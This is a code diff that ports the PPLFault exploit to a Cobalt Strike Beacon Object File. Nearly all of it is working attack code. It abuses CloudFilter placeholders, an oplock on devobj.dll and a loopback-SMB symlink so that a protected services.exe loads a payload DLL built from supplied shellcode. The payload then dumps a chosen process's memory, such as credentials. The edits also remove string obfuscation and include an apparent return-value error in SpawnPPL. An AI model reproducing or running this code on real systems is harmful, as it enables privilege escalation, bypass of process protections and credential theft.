@@ -6,14 +6,13 @@
 #include <cfapi.h>
 #include <pathcch.h>
 #include <Shlwapi.h>
+#include <stdint.h>
 
 #include "bofdefs.h"
 #include "beacon.h"
 #include "MemoryCommand.h"
 #include "Payload.h"
 #include "DumpShellcode.h"
-#include "Logging.h"
-#include "stringobf.h"
 
 CF_CONNECTION_KEY gConnectionKey = { 0, };
 WIN32_FILE_ATTRIBUTE_DATA gBenignFileAttributes = { 0, };
@@ -21,7 +20,7 @@ HANDLE hBenignFile = NULL;
 HANDLE hPayloadFile = NULL;
 HANDLE hCurrentFile = NULL;
 
-const wchar_t* gpOplockFile = WOBF(L"C:\\Windows\\System32\\devobj.dll");
+const wchar_t* gpOplockFile = L"C:\\Windows\\System32\\devobj.dll";
 HANDLE hOplockFile = NULL;
 HANDLE hOplockEvent = NULL;
 
@@ -34,10 +33,10 @@ HANDLE hOplockEvent = NULL;
 #define PAYLOAD_DLL_PATH L"C:\\PPLFaultTemp\\PPLFaultPayload.dll"
 
 // Acquires a level 1 (aka exclusive) oplock to gpOplockFile and stores the resulting file handle in hOplockFile
-bool AcquireOplock()
+BOOL AcquireOplock()
 {
     HANDLE hFile = NULL;
-    OVERLAPPED ovl = { NULL, };
+    OVERLAPPED ovl = { 0 };
 
     hFile = KERNEL32$CreateFileW(
         gpOplockFile, FILE_READ_ATTRIBUTES, 
@@ -45,33 +44,33 @@ bool AcquireOplock()
         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
     if (INVALID_HANDLE_VALUE == hFile)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("CreateFile for oplock failed with GLE %u"), GetLastError());
-        return false;
+        BeaconPrintf(CALLBACK_ERROR, "CreateFile for oplock failed with GLE %u", KERNEL32$GetLastError());
+        return FALSE;
     }
 
     ovl.hEvent = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
     if (KERNEL32$DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ovl))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("DeviceIoControl for oplock succeeded when it should not have"));
+        BeaconPrintf(CALLBACK_ERROR, "DeviceIoControl for oplock succeeded when it should not have");
         KERNEL32$CloseHandle(hFile);
         KERNEL32$CloseHandle(ovl.hEvent);
-        return false;
+        return FALSE;
     }
 
-    if (ERROR_IO_PENDING != GetLastError())
+    if (ERROR_IO_PENDING != KERNEL32$GetLastError())
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("DeviceIoControl for oplock failed with unexpected GLE %u"), GetLastError());
+        BeaconPrintf(CALLBACK_ERROR,"DeviceIoControl for oplock failed with unexpected GLE %u", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(hFile);
         KERNEL32$CloseHandle(ovl.hEvent);
-        return false;
+        return FALSE;
     }
 
-    internal_printf( OBF("Acquired exclusive oplock to file: %ws"), gpOplockFile);
+    internal_printf( "Acquired exclusive oplock to file: %ws", gpOplockFile);
     
     hOplockFile = hFile;
     hOplockEvent = ovl.hEvent;
 
-    return true;
+    return TRUE;
 }
 
 void ReleaseOplock()
@@ -84,34 +83,35 @@ void ReleaseOplock()
 
 // This is our CloudFilter rehydration callback
 VOID CALLBACK FetchDataCallback (
-    _In_ CONST CF_CALLBACK_INFO* CallbackInfo,
-    _In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
+    CONST CF_CALLBACK_INFO* CallbackInfo,
+    CONST CF_CALLBACK_PARAMETERS* CallbackParameters
     )
 {
-    std::string buf;
+    void* buf;
     DWORD bytesRead = 0;
     NTSTATUS ntStatus = 0;
     HRESULT hRet = S_OK;
 
     static SRWLOCK sFetchDataCallback = SRWLOCK_INIT;
 
-    internal_printf( OBF("FetchDataCallback called."));
+    internal_printf( "FetchDataCallback called.");
 
     // Use an SRWLock to synchronize this function
     KERNEL32$AcquireSRWLockExclusive(&sFetchDataCallback);
 
     // Read the current file's contents at requested offset into a local buffer
     // This could be either the benign file, or the payload file
-    buf.resize(CallbackParameters->FetchData.RequiredLength.QuadPart);
+    buf = intAlloc(CallbackParameters->FetchData.RequiredLength.QuadPart);
+  /*  buf.resize(CallbackParameters->FetchData.RequiredLength.QuadPart);*/
     if (!KERNEL32$SetFilePointerEx(hCurrentFile, CallbackParameters->FetchData.RequiredFileOffset, NULL, FILE_BEGIN))
     {
-        ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
-        BeaconPrintf(CALLBACK_ERROR, OBF("SetFilePointerEx failed with GLE %u"), GetLastError());
+        ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "SetFilePointerEx failed with GLE %u", KERNEL32$GetLastError());
     }
-    if (!KERNEL32$ReadFile(hCurrentFile, &buf[0], (DWORD)buf.size(), &bytesRead, NULL))
+    if (!KERNEL32$ReadFile(hCurrentFile, buf, (DWORD)CallbackParameters->FetchData.RequiredLength.QuadPart, &bytesRead, NULL))
     {
-        ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
-        BeaconPrintf(CALLBACK_ERROR, OBF("ReadFile failed with GLE %u"), GetLastError());
+        ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "ReadFile failed with GLE %u", KERNEL32$GetLastError());
     }
 
     CF_OPERATION_INFO opInfo = { 0, };
@@ -124,18 +124,18 @@ VOID CALLBACK FetchDataCallback (
 
     opParams.ParamSize = sizeof(opParams);
     opParams.TransferData.CompletionStatus = ntStatus;
-    opParams.TransferData.Buffer = &buf[0];
+    opParams.TransferData.Buffer = buf;
     opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
     opParams.TransferData.Length.QuadPart = bytesRead;
     
-    internal_printf( OBF("Hydrating %llu bytes at offset %llu"), 
+    internal_printf( "Hydrating %llu bytes at offset %llu", 
         opParams.TransferData.Length.QuadPart,
         opParams.TransferData.Offset.QuadPart);
 
     hRet = CLDAPI$CfExecute(&opInfo, &opParams);
     if (!SUCCEEDED(hRet))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("CfExecute failed with HR 0x%08x GLE %u"), hRet, GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "CfExecute failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
     }
 
     // Once the benign file has been fully read once, switch over to the payload
@@ -144,42 +144,43 @@ VOID CALLBACK FetchDataCallback (
             gBenignFileAttributes.nFileSizeLow))
 
     {
-        internal_printf( OBF("Switching to payload"));
+        internal_printf( "Switching to payload");
         hCurrentFile = hPayloadFile;
 
-        internal_printf( OBF("Emptying system working set"));
+        internal_printf( "Emptying system working set");
         EmptySystemWorkingSet();
 
-        internal_printf( OBF("Give the memory manager a moment to think"));
-        Sleep(100);
+        internal_printf( "Give the memory manager a moment to think");
+        KERNEL32$Sleep(100);
 
-        buf.clear();
-        buf.resize(gBenignFileAttributes.nFileSizeLow);
-
-        if (!KERNEL32$SetFilePointerEx(hCurrentFile, { 0,0 }, NULL, FILE_BEGIN))
+        MSVCRT$memset(buf, 0, CallbackParameters->FetchData.RequiredLength.QuadPart);
+        intFree(buf);
+        buf = intAlloc(gBenignFileAttributes.nFileSizeLow);
+        LARGE_INTEGER offset = { 0,0 };
+        if (!KERNEL32$SetFilePointerEx(hCurrentFile, offset, NULL, FILE_BEGIN))
         {
-            ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
-            BeaconPrintf(CALLBACK_ERROR, OBF("SetFilePointerEx failed with GLE %u"), GetLastError());
+            ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "SetFilePointerEx failed with GLE %u", KERNEL32$GetLastError());
         }
 
-        if (!KERNEL32$ReadFile(hCurrentFile, &buf[0], (DWORD)buf.size(), &bytesRead, NULL))
+        if (!KERNEL32$ReadFile(hCurrentFile, buf, gBenignFileAttributes.nFileSizeLow, &bytesRead, NULL))
         {
-            ntStatus = NTSTATUS_FROM_WIN32(GetLastError());
-            BeaconPrintf(CALLBACK_ERROR, OBF("ReadFile failed with GLE %u"), GetLastError());
+            ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "ReadFile failed with GLE %u", KERNEL32$GetLastError());
         }
 
-        opParams.TransferData.Buffer = &buf[0];
-        opParams.TransferData.Offset = { 0, 0 };
+        opParams.TransferData.Buffer = buf;
+        opParams.TransferData.Offset.QuadPart = 0;
         opParams.TransferData.Length.QuadPart = bytesRead;
 
-        internal_printf( OBF("Hydrating %llu PAYLOAD bytes at offset %llu"),
+        internal_printf( "Hydrating %llu PAYLOAD bytes at offset %llu",
             opParams.TransferData.Length.QuadPart,
             opParams.TransferData.Offset.QuadPart);
 
         hRet = CLDAPI$CfExecute(&opInfo, &opParams);
         if (!SUCCEEDED(hRet))
         {
-            BeaconPrintf(CALLBACK_ERROR, OBF("CfExecute failed with HR 0x%08x GLE %u"), hRet, GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "CfExecute failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
         }
 
         // With the payload staged, release the oplock to allow the victim to execute
@@ -190,32 +191,33 @@ VOID CALLBACK FetchDataCallback (
 }
 
 // Uses SeRestorePrivilege to move the given file
-bool MoveFileWithPrivilege(const std::wstring& src, const std::wstring& dest)
+BOOL MoveFileWithPrivilege(const wchar_t * src, wchar_t * dest)
 {
-    bool bResult = false;
+    BOOL bResult = FALSE;
     HANDLE hFile = INVALID_HANDLE_VALUE;
     BOOLEAN ignored = 0;
     NTSTATUS ntStatus = 0;
     PFILE_RENAME_INFO pRenameInfo = NULL;
-    std::string buf;
-    const std::wstring ntDest = L"\\??\\" + dest;
+    void* buf;
+    wchar_t ntDest[MAX_PATH] = L"\\??\\";
+    MSVCRT$wcscat(ntDest, dest);
 
     ntStatus = NTDLL$RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &ignored);
     if (0 != ntStatus)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("MoveFileWithPrivilege: RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE) failed with NTSTATUS 0x%08x"), ntStatus);
+        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
         goto Cleanup;
     }
 
     ntStatus = NTDLL$RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &ignored);
     if (0 != ntStatus)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("MoveFileWithPrivilege: RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE) failed with NTSTATUS 0x%08x"), ntStatus);
+        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
         goto Cleanup;
     }
 
     hFile = KERNEL32$CreateFileW(
-        src.c_str(), 
+        src, 
         SYNCHRONIZE | DELETE, 
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
         NULL, 
@@ -224,22 +226,21 @@ bool MoveFileWithPrivilege(const std::wstring& src, const std::wstring& dest)
         NULL);
     if (INVALID_HANDLE_VALUE == hFile)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("MoveFileWithPrivilege: CreateFile failed with GLE %u"), GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: CreateFile failed with GLE %u", KERNEL32$GetLastError());
         goto Cleanup;
     }
+    buf = intAlloc(sizeof(FILE_RENAME_INFO) + (MSVCRT$wcslen(ntDest) * sizeof(wchar_t)) + 2);
+    pRenameInfo = (PFILE_RENAME_INFO)buf;
+    pRenameInfo->FileNameLength = (DWORD)(MSVCRT$wcslen(ntDest) * sizeof(wchar_t));
+    MSVCRT$memcpy(pRenameInfo->FileName, ntDest, pRenameInfo->FileNameLength);
 
-    buf.resize(sizeof(FILE_RENAME_INFO) + (ntDest.size() * sizeof(wchar_t)));
-    pRenameInfo = (PFILE_RENAME_INFO)&buf[0];
-    pRenameInfo->FileNameLength = (DWORD)(ntDest.size() * sizeof(wchar_t));
-    MSVCRT$memcpy(pRenameInfo->FileName, &ntDest[0], pRenameInfo->FileNameLength);
-
-    if (!KERNEL32$SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)buf.size()))
+    if (!KERNEL32$SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)pRenameInfo->FileNameLength))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("MoveFileWithPrivilege: SetFileInformationByHandle failed with GLE %u"), GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: SetFileInformationByHandle failed with GLE %u", KERNEL32$GetLastError());
         goto Cleanup;
     }
 
-    bResult = true;
+    bResult = TRUE;
 
 Cleanup:
     if (INVALID_HANDLE_VALUE != hFile)
@@ -250,40 +251,40 @@ Cleanup:
     return bResult;
 }
 
-bool FileExists(const std::wstring& path)
+BOOL FileExists(const wchar_t* path)
 {
-    return (INVALID_FILE_ATTRIBUTES != KERNEL32$GetFileAttributesW(path.c_str()));
+    return (INVALID_FILE_ATTRIBUTES != KERNEL32$GetFileAttributesW(path));
 }
 
 // Replace HIJACK_DLL_PATH symlink to PLACEHOLDER_DLL_PATH_SMB
-bool InstallSymlink()
+BOOL InstallSymlink()
 {
     // Make sure PLACEHOLDER exists
     if (!FileExists(PLACEHOLDER_DLL_PATH))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u"), GetLastError());
-        return false;
+        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u", KERNEL32$GetLastError());
+        return FALSE;
     }
     
     // Move HIJACK => BACKUP
     if (!MoveFileWithPrivilege(HIJACK_DLL_PATH, HIJACK_DLL_PATH_BACKUP))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("InstallSymlink: MoveFileExW failed with GLE: %u"), GetLastError());
-        return false;
+        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: MoveFileExW failed with GLE: %u", KERNEL32$GetLastError());
+        return FALSE;
     }
     
     // Symlink HIJACK => PLACEHOLDER over SMB
-    if (!CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH_SMB, 0))
+    if (!KERNEL32$CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH_SMB, 0))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("InstallSymlink: CreateSymbolicLinkW failed with GLE: %u"), GetLastError());
-        return false;
+        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: CreateSymbolicLinkW failed with GLE: %u", KERNEL32$GetLastError());
+        return FALSE;
     }
 
-    return true;
+    return TRUE;
 }
 
 // Reverts the changes done by InstallSymlink()
-bool CleanupSymlink()
+BOOL CleanupSymlink()
 {
     // Delete PLACEHOLDER
     (void)KERNEL32$DeleteFileW(PLACEHOLDER_DLL_PATH);
@@ -291,55 +292,55 @@ bool CleanupSymlink()
     // Make sure BACKUP exists before attempting to restore
     if (!FileExists(HIJACK_DLL_PATH_BACKUP))
     {
-        internal_printf( OBF("No cleanup necessary.  Backup does not exist."));
-        return false;
+        internal_printf( "No cleanup necessary.  Backup does not exist.");
+        return FALSE;
     }
 
     // Delete symlink
-    (void)DeleteFile(HIJACK_DLL_PATH);
+    (void)KERNEL32$DeleteFileW(HIJACK_DLL_PATH);
 
     // Restore BACKUP => HIJACK
     if (!MoveFileWithPrivilege(HIJACK_DLL_PATH_BACKUP, HIJACK_DLL_PATH))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("InstallSymlink: MoveFileExW failed with GLE: %u"), GetLastError());
-        return false;
+        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: MoveFileExW failed with GLE: %u", KERNEL32$GetLastError());
+        return FALSE;
     }
     
-    return true;
+    return TRUE;
 }
 
 // Launches services.exe as WinTcb-Light and waits up to 60s for it
-bool SpawnPPL()
+BOOL SpawnPPL()
 {
-    std::wstring childPath = L"C:\\Windows\\System32\\services.exe";
+    wchar_t childPath[] = L"C:\\Windows\\System32\\services.exe";
     STARTUPINFOW si = { 0, };
     PROCESS_INFORMATION pi = { 0, };
     DWORD dwResult = 0;
 
     si.cb = sizeof(si);
 
-    if (!KERNEL32$CreateProcessW(childPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi))
+    if (!KERNEL32$CreateProcessW(childPath, NULL, NULL, NULL, FALSE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("SpawnPPL: CreateProcessW failed with GLE: %u"), GetLastError());
-        return false;
+        BeaconPrintf(CALLBACK_ERROR, "SpawnPPL: CreateProcessW failed with GLE: %u", KERNEL32$GetLastError());
+        return FALSE;
     }
 
-    internal_printf( OBF("SpawnPPL: Waiting for child process to finish."));
+    internal_printf( "SpawnPPL: Waiting for child process to finish.");
     
     dwResult = KERNEL32$WaitForSingleObject(pi.hProcess, 60 * 1000);
     if (WAIT_OBJECT_0 != dwResult)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("SpawnPPL: WaitForSingleObject returned %u.  Expected WAIT_OBJECT_0.  GLE: %u"), dwResult, GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "SpawnPPL: WaitForSingleObject returned %u.  Expected WAIT_OBJECT_0.  GLE: %u", dwResult, KERNEL32$GetLastError());
     }
 
     KERNEL32$CloseHandle(pi.hProcess);
     KERNEL32$CloseHandle(pi.hThread);
 
-    return true;
+    return FALSE;
 }
 
 // Is this a valid PID?
-bool IsValidPID(DWORD dwProcessId)
+BOOL IsValidPID(DWORD dwProcessId)
 {
     HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
     if (NULL == hProcess)
@@ -350,7 +351,7 @@ bool IsValidPID(DWORD dwProcessId)
     return TRUE;
 }
 
-int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
+int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode, DWORD shellcodelen)
 {
     int result = 1;
     DWORD bytesWritten = 0;
@@ -359,8 +360,8 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
     CF_CONNECTION_KEY key = { 0 };
     ULONGLONG startTime = KERNEL32$GetTickCount64();
     ULONGLONG endTime = 0;
-    std::wstring dumpPath;
-    std::string payloadBuf;
+    wchar_t * dumpPath;
+    char* payloadBuf;
    
     // Handle verbose logging
 
@@ -368,51 +369,52 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
     dumpPath = outputPath;
     if (!IsValidPID(dwTargetProcessId))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("This doesn't appear to be a valid PID: %u"), dwTargetProcessId);
+        BeaconPrintf(CALLBACK_ERROR, "This doesn't appear to be a valid PID: %u", dwTargetProcessId);
         return 1;
     }
 
     // Clean up from any previous failed runs
     (void)CleanupSymlink();
-    (void)CreateDirectoryW(PLACEHOLDER_DLL_DIR, NULL);
+    (void)KERNEL32$CreateDirectoryW(PLACEHOLDER_DLL_DIR, NULL);
 
     hBenignFile = KERNEL32$CreateFileW(HIJACK_DLL_PATH, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (INVALID_HANDLE_VALUE == hBenignFile)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("Failed to open file with GLE %u: %ws"), GetLastError(), HIJACK_DLL_PATH);
+        BeaconPrintf(CALLBACK_ERROR, "Failed to open file with GLE %u: %ws", KERNEL32$GetLastError(), HIJACK_DLL_PATH);
         return 1;
     }
 
     hPayloadFile = KERNEL32$CreateFileW(PAYLOAD_DLL_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
     if (INVALID_HANDLE_VALUE == hPayloadFile)
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("Failed to open file with GLE %u: %ws"), GetLastError(), PAYLOAD_DLL_PATH);
+        BeaconPrintf(CALLBACK_ERROR, "Failed to open file with GLE %u: %ws", KERNEL32$GetLastError(), PAYLOAD_DLL_PATH);
         return 1;
     }
 
     hCurrentFile = hBenignFile;
-
+    DWORD payloadLen = 0;
     // Create the payload using the benign file
-    if (!BuildPayload(hBenignFile, payloadBuf, dwTargetProcessId, dumpPath.c_str()))
+    if (!BuildPayload(hBenignFile, &payloadBuf, dwTargetProcessId, dumpPath, &payloadLen, shellcode, shellcodelen))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("Failed to build payload"));
+        BeaconPrintf(CALLBACK_ERROR, "Failed to build payload");
         return 1;
     }
 
-    if (!KERNEL32$WriteFile(hPayloadFile, payloadBuf.data(), (DWORD)payloadBuf.size(), &bytesWritten, NULL) ||
-        (bytesWritten != payloadBuf.size()))
+    if (!KERNEL32$WriteFile(hPayloadFile, payloadBuf, (DWORD)payloadLen, &bytesWritten, NULL) ||
+        (bytesWritten != payloadLen))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("Failed to write payload file with GLE %u: %ws"), GetLastError(), PAYLOAD_DLL_PATH);
+        BeaconPrintf(CALLBACK_ERROR, "Failed to write payload file with GLE %u: %ws", KERNEL32$GetLastError(), PAYLOAD_DLL_PATH);
         return 1;
     }
-
+    intFree(payloadBuf);
+    GUID gid = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };
     // CloudFilter APIs based on https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html
     CF_SYNC_REGISTRATION syncReg = { 0 };
     syncReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
     syncReg.ProviderName = L"CloudTest";
     syncReg.ProviderVersion = L"1.0";
     // {119C6523-407B-446B-B0E3-E03011178F50}
-    syncReg.ProviderId = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };
+    syncReg.ProviderId = gid;
 
     CF_SYNC_POLICIES policies = { 0 };
     policies.StructSize = sizeof(CF_SYNC_POLICIES);
@@ -426,12 +428,12 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
     hRet = CLDAPI$CfRegisterSyncRoot(PLACEHOLDER_DLL_DIR, &syncReg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
     if (!SUCCEEDED(hRet))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("CfRegisterSyncRoot failed with HR 0x%08x GLE %u"), hRet, GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "CfRegisterSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
         return 1;
     }
 
     // Connect our callback to the synchronization root
-    CF_CALLBACK_REGISTRATION cbReg[2] = {};
+    CF_CALLBACK_REGISTRATION cbReg[2] = {0};
     cbReg[0].Callback = FetchDataCallback;
     cbReg[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
     cbReg[1].Type = CF_CALLBACK_TYPE_NONE;
@@ -440,13 +442,13 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
     if (!SUCCEEDED(hRet))
     {
         CLDAPI$CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
-        BeaconPrintf(CALLBACK_ERROR, OBF("CfConnectSyncRoot failed with HR 0x%08x GLE %u"), hRet, GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
         return 1;
     }
 
     if (!KERNEL32$GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("GetFileAttributesExW on benign file failed with GLE %u"), hRet, GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "GetFileAttributesExW on benign file failed with GLE %u", hRet, KERNEL32$GetLastError());
         return 1;
     }
 
@@ -460,21 +462,21 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
     phInfo.RelativeFileName = PLACEHOLDER_DLL_BASENAME;
     phInfo.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
     phInfo.FileIdentityLength = 0x130;
-    phInfo.FileIdentity = malloc(phInfo.FileIdentityLength);
+    phInfo.FileIdentity = intAlloc(phInfo.FileIdentityLength);
 
     DWORD processed = 0;
     hRet = CLDAPI$CfCreatePlaceholders(PLACEHOLDER_DLL_DIR, &phInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
     if (!SUCCEEDED(hRet) || (1 != processed))
     {
         CLDAPI$CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
-        BeaconPrintf(CALLBACK_ERROR, OBF("CfCreatePlaceholders failed with HR 0x%08x GLE %u"), hRet, GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "CfCreatePlaceholders failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
         return 1;
     }
 
     // Replace target file with a symlink over loopback SMB to the placeholder file
     if (!InstallSymlink())
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("InstallSymlink failed.  Aborting."));
+        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink failed.  Aborting.");
         return 1;
     }
 
@@ -488,28 +490,28 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
     }
 
     // Remove any old dump files
-    if (FileExists(dumpPath.c_str()))
+    if (FileExists(dumpPath))
     {
-        if (KERNEL32$DeleteFileW(dumpPath.c_str()))
+        if (KERNEL32$DeleteFileW(dumpPath))
         {
-            internal_printf( OBF("Removed old dump file: %ws"), dumpPath.c_str());
+            internal_printf( "Removed old dump file: %ws", dumpPath);
         }
         else
         {
-            BeaconPrintf(CALLBACK_ERROR, OBF("Failed to remove old dump file: %ws"), dumpPath.c_str());
+            BeaconPrintf(CALLBACK_ERROR, "Failed to remove old dump file: %ws", dumpPath);
             goto Cleanup;
         }
     }
 
-    internal_printf( OBF("Ready.  Spawning WinTcb."));
+    internal_printf( "Ready.  Spawning WinTcb.");
     if (!SpawnPPL())
     {
         goto Cleanup;
     }
 
-    if (!FileExists(dumpPath.c_str()))
+    if (!FileExists(dumpPath))
     {
-        BeaconPrintf(CALLBACK_ERROR, OBF("Did not find expected dump file: %ws"), dumpPath.c_str());
+        BeaconPrintf(CALLBACK_ERROR, "Did not find expected dump file: %ws", dumpPath);
         goto Cleanup;
     }
 
@@ -519,28 +521,28 @@ int progentry(DWORD dwTargetProcessId, wchar_t * outputPath)
         ULARGE_INTEGER uli = { 0, };
         WCHAR bytesPretty[32] = { 0, };
 
-        if (!KERNEL32$GetFileAttributesExW(dumpPath.c_str(), GetFileExInfoStandard, &dumpAttr))
+        if (!KERNEL32$GetFileAttributesExW(dumpPath, GetFileExInfoStandard, &dumpAttr))
         {
-            BeaconPrintf(CALLBACK_ERROR, OBF("Failed to find dump file attributes with GLE %u"), GetLastError());
+            BeaconPrintf(CALLBACK_ERROR, "Failed to find dump file attributes with GLE %u", KERNEL32$GetLastError());
             goto Cleanup;
         }
 
         uli.LowPart = dumpAttr.nFileSizeLow;
         uli.HighPart = dumpAttr.nFileSizeHigh;
 
-        internal_printf( OBF("Dump saved to: %ws"), dumpPath.c_str());
+        internal_printf( "Dump saved to: %ws", dumpPath);
 
         if (!SHLWAPI$StrFormatByteSizeW(uli.QuadPart, bytesPretty, _countof(bytesPretty)))
         {
-            internal_printf( OBF("StrFormatByteSizeW failed with GLE %u"), GetLastError());
+            internal_printf( "StrFormatByteSizeW failed with GLE %u", KERNEL32$GetLastError());
         }
         else
         {
-            internal_printf( OBF("Dump is %ws"), bytesPretty);
+            internal_printf( "Dump is %ws", bytesPretty);
         }
 
         endTime = KERNEL32$GetTickCount64();
-        internal_printf( OBF("Operation took %u ms"), endTime - startTime);
+        internal_printf( "Operation took %u ms", endTime - startTime);
     }
 
     result = 0;
